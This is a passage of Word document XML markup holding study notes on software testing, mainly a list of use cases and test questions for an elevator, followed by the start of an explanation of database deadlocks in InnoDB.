        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Some of the use cases would be</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>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1) Elevator is capable of moving up and down.</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2) It is stopping at each floor.</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3) It moves exactly to that floor when corresponding floor no is pressed.</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4) It moves up when called from upward and down when called from downward.</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5) It waits until 'close' button is pressed.</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 xml:space="preserve">6) If </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>anyon</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> steps </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>inbetween</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> the door at the time of closing, door should open.</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7) No break points exists</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 xml:space="preserve">8) More </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>usecases</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> for the load that the elevator can carry (if required</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:br/>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ADDITIONAL:</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1) When I push the call button, does it come to the floor and open the door after stopping?</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2) Do the doors stay open for at least 5 seconds?</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3) When closing, do the doors reverse if someone is standing in their way?</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4) Does the elevator wait for someone to push a floor button before moving?</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5) Does the elevator ignore the floor button of the current floor?</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6) Does the floor button light up when pressed?</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7) Does the Open Door button work when the elevator is moving?</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8) Does the elevator travel in a smooth fashion?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>9) Is there an up button on the top floor or a down button on the bottom floor?</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="333333"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00D01BD2" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:before="75" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:outlineLvl w:val="2"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="555544"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t xml:space="preserve">32. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t>test</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t xml:space="preserve"> case for Lift?</w:t>
      </w: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r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t>1. Check for the appropriate no of buttons?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>2. What happen if I touch the open button twice?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>3. What happen when I press open button while lift is</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>moving and it is in the middle of the two floors?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>4. What happen when I press the open button for some time?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>5. Check for the sound when lift is opening.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>6. Check for the direction by pressing up and down button.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>7. Enter in the lift specify the floor say 4 and check for</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>the corresponding floor?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>8. Lift is moving and the power break off. Does the alarm</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>blow in the control room that there is power break off?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>9. Also check for the case how the inside person inform the</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>lift man that he got stuck in the lift (if there is phone</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>button does it works)?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>10. Also check for the response time to start lift again?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>11. When a person is in the lift any light is there or not?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>12. How many persons at a time will carry the lift in the</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>since in moving time.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">13. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t>With out</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t xml:space="preserve"> load if we press the up button is it moving or</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>not.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">14. What happen </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t>with out</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t xml:space="preserve"> specifying the floor number if we</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>press the up or down?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>15. What happen if the lift is in over load mode (over load</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>sound will come before moving or it moves).</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">16. </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t>With out</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t xml:space="preserve"> load if we press the up button and specify the</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>floor number what is happening?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>17. Is the door get closed itself or have to close manually.</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>18. If the door closed automatically check for the closing</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>time?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>19. If the door closed automatically also check for the</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>sensor? Suppose the closing time is 2 min and it passed and</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>people are still getting in. What happen does the door get</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>closed or wait for the people to get in?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>20. What happen when you press the same floor number on</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>which lift is already there?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>21. After getting into the lift one person is there he</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>wants to go up but we want to go down already he specified</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>the floor number before we enter in to the lift. After that</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>we specified our floor number then what will be the</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>priority of the lift?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>22. Lift is empty and is moving downwards I entered and</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>want to go up. Is there the button to change the direction</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>of lift and the button working?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">23. Is the floor number displayed up </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t>in side</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t xml:space="preserve"> the lift</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>correct?</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t xml:space="preserve">24. When happen when the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t>out side</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t xml:space="preserve"> person want to open the</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>door but</w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:br/>
        <w:t>Inside person wants to close the door at the same time.</w:t>
      </w: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shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="273" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="555544"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t>DeadLock</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:eastAsia="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:color w:val="555544"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00D01BD2" w:rsidRPr="00584E67" w:rsidRDefault="00B84F48" w:rsidP="00D01BD2">
      <w:pPr>
        <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        <w:spacing w:line="273" w:lineRule="atLeast"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:hyperlink r:id="rId35" w:anchor="glos_deadlock" w:tooltip="deadlock" w:history="1">
        <w:r w:rsidR="00D01BD2" w:rsidRPr="00584E67">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="0074A3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>Deadlocks</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="00D01BD2" w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidR="00D01BD2" w:rsidRPr="00584E67">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>are a classic problem in transactional databases, but they are not dangerous unless they are so frequent that you cannot run certain transactions at all. Normally, you must write your applications so that they are always prepared to re-issue a transaction if it gets rolled back because of a deadlock.</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proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="HTMLCode"/>
          <w:rFonts w:ascii="Times New Roman" w:eastAsiaTheme="minorHAnsi" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
          <w:bdr w:val="none" w:sz="0" w:space="0" w:color="auto" w:frame="1"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>InnoDB</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
          <w:rStyle w:val="apple-converted-space"/>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="555555"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="00584E67">
        <w:rPr>
